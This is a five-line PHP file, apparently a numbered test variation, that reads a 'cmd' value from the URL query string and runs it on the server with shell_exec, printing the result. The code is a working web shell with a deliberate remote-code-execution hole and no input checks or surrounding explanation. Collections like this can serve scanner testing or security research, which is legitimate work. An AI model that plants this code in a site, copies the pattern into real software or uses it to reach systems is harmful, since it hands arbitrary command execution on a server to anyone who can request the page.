<?php
// RCE test variation #793
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>